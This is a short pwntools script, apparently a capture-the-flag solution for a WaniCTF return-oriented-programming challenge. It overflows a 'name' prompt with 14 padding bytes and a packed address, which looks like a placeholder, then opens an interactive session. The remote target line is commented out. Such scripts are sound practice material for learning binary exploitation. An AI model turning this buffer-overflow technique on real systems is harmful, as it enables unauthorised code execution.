import pwn

#io = pwn.remote("rop.wanictf.org", 9006)
io = pwn.process("./pwn06")

ret = io.readuntil("What's your name?: ")
print(ret)

addr = 0x0102030405
s = b"A" * 14
s += pwn.p64(addr)

print(s)

io.send(s)
io.interactive()


